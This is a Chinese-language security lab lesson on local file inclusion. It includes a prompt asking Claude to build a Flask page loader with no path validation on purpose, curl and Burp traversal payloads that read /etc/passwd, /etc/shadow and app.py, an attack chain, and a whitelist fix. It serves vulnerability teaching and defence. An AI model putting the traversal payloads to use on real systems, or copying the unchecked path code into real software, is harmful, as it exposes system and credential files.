# Day 6 - 文件包含漏洞（LFI）

---

## 一、发给 Claude 的提示词

把以下内容完整复制粘贴到 claude.ai 对话框中：

```
请在上次已有的功能基础上，继续增加动态页面加载功能。保持原有功能不变。

### 在 app.py 中新增以下内容：

1. 新增路由 /page，支持 GET：
   - 从 URL 参数获取页面名称（如 /page?name=help）
   - 使用拼接字符串的方式构建文件路径：os.path.join("pages", name)
   - 如果文件存在则读取内容并显示在首页上
   - 如果文件不存在，尝试加上 .html 后缀再找一次
   - 如果仍然找不到则显示"页面不存在"
   - 不要对 name 参数做任何路径校验或 ../ 过滤

2. 在 pages/ 目录中创建 help.html 文件（简单的帮助中心页面）

### 修改 templates/index.html

- 在首页中添加 page_content 显示区域
- 如果 page_content 变量存在则显示页面内容
- 添加"帮助中心"入口链接：/page?name=help

### 代码规范要求
- 直接拼接用户输入的 name 到路径中
- 不要检查路径中是否包含 "../"
- 不要使用 os.path.abspath 或 os.path.realpath 规范化路径

生成全部代码后告诉我，我复制覆盖到本地项目中。
```

---

## 二、学生操作步骤

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 复制上面提示词发给 Claude | 在上次功能基础上增加动态页面加载 |
| 2 | Claude 生成后，覆盖 app.py 和 templates/index.html | 保持原有功能不变 |
| 3 | 创建 pages/help.html | 帮助中心页面 |
| 4 | 终端运行 `python app.py` | 启动项目 |
| 5 | 用 curl 测试 LFI 路径穿越 | 见下方 POC |
| 6 | 分析代码，编写修复到 fix/page_loader_fix.py | 修复漏洞 |
| 7 | `git add -A && git commit -m "day-06: 动态页面加载 + LFI修复"` | 提交成果 |

---

## 三、漏洞原理

### 漏洞：本地文件包含（LFI）

```python
# 用户输入的 name 直接拼接到路径中，无任何过滤
import os
PAGES_DIR = "pages"

def load_page(name):
    # 先尝试精确路径
    file_path = os.path.join(PAGES_DIR, name)
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            return f.read()

    # 不存在则尝试加 .html
    file_path = os.path.join(PAGES_DIR, name) + ".html"
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            return f.read()

    return None
```

**问题**：
- `name` 参数来自 URL，没有做任何 `../` 过滤
- `os.path.join` 不会阻止路径穿越
- 文件内容直接返回给用户（有回显）

**攻击原理**：
```
正常请求：/page?name=help
  → os.path.join("pages", "help") → "pages/help"
  → 不存在，尝试 "pages/help.html" → 存在，读取返回

恶意请求：/page?name=../../../etc/passwd
  → os.path.join("pages", "../../../etc/passwd") → "pages/../../../etc/passwd"
  → 解析后为 "/etc/passwd" → 存在，读取返回
```

---

## 四、POC 代码

### POC 1：正常页面加载

```bash
curl "http://127.0.0.1:5000/page?name=help"
```

**预期结果**：显示帮助中心内容。

### POC 2：读取系统文件 /etc/passwd

```bash
curl "http://127.0.0.1:5000/page?name=../../../etc/passwd"
```

**预期结果**：返回 /etc/passwd 文件内容（包含 root:x）。

### POC 3：读取项目源码

```bash
# 读取 app.py
curl "http://127.0.0.1:5000/page?name=../app.py"

# 读取其他系统文件
curl "http://127.0.0.1:5000/page?name=../../../etc/hostname"
curl "http://127.0.0.1:5000/page?name=../../../etc/issue"
```

**预期结果**：返回对应文件的内容。

---

## 五、Burp Suite 测试方法

1. 登录后访问 `/page?name=help`，拦截请求
2. 发送到 Repeater
3. 修改 name 参数测试：
   - `../../../etc/passwd` → 读取系统密码文件
   - `../app.py` → 读取项目源码
   - `../../../etc/shadow` → 读取密码哈希（需要 root 权限）
4. 观察响应中是否包含文件内容

---

## 六、POC 代码详细解释

### 路径穿越计算

```
pages/ 目录在项目的根目录下

请求 name=help
  → pages/help → pages/help.html ✅

请求 name=../app.py
  → pages/../app.py → 解析为 app.py ✅

请求 name=../../../etc/passwd
  → pages/../../../etc/passwd
  → 解析为 /etc/passwd ✅

../ 层数计算：
  pages/           → 第1层
  ../              → 回到项目根目录（第1次穿越）
  ../../           → 回到上级目录（第2次穿越）
  ../../../        → 回到根目录（第3次穿越）
  ../../../etc/passwd → /etc/passwd
```

### 攻击链

```
攻击者发现 /page 路由
  → 测试 name=help 正常
  → 测试 name=../app.py 返回源码
  → 确认 LFI 漏洞存在
  → 读取 /etc/passwd 获取系统用户信息
  → 读取 /etc/shadow 尝试破解密码
  → 读取源码寻找更多漏洞
  → 结合 Day2 读取 core/auth.py 获取硬编码密码
```

---

## 七、修复方案

创建 `fix/page_loader_fix.py`：

```python
import os

# 修复 1：白名单——只允许加载预定义页面
ALLOWED_PAGES = {"help", "about", "contact"}

def load_page_fixed(name):
    """修复：白名单校验 + 路径安全检查"""

    # 修复 1：白名单校验
    if name not in ALLOWED_PAGES:
        return None, "页面不存在"

    # 修复 2：使用安全的路径拼接
    safe_name = os.path.basename(name)  # 只取文件名，去掉目录部分
    file_path = os.path.join("pages", safe_name + ".html")

    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            return f.read(), None

    return None, "页面不存在"
```

**为什么白名单能防御？**

```
攻击前：name=../../../etc/passwd → ALLOWED_PAGES 里没有 → 拒绝
攻击后：name=help → ALLOWED_PAGES 里有 → 允许
```

**为什么 os.path.basename 能防御？**

```
os.path.basename("../../../etc/passwd") → "passwd"
安全路径 = pages/passwd.html → 读不到 passwd.html → 拒绝
```

---

## 八、漏洞复现检查清单

| # | 检查项 | curl 命令 | 预期结果 |
|---|--------|----------|---------|
| 1 | 帮助页面 | `?name=help` | 显示帮助内容 |
| 2 | 读取 /etc/passwd | `?name=../../../etc/passwd` | 显示 root:x |
| 3 | 读取 app.py | `?name=../app.py` | 显示源码 |
| 4 | 页面不存在 | `?name=nonexist` | 提示页面不存在 |

---

## 九、课后任务

1. 用 curl 测试不同层级的路径穿越（../、../../、../../../）
2. 尝试读取 /etc/shadow（观察权限限制）
3. 读取 app.py 确认 LFI 漏洞的代码位置
4. 在 fix/ 目录下编写修复代码，使用白名单防御
5. 验证修复后路径穿越被阻止，help 页面仍可正常访问
6. （进阶）如果必须支持动态页面名，如何使用 os.path.abspath 和 os.path.commonpath 防御？
7. 提交到自己的个人分支
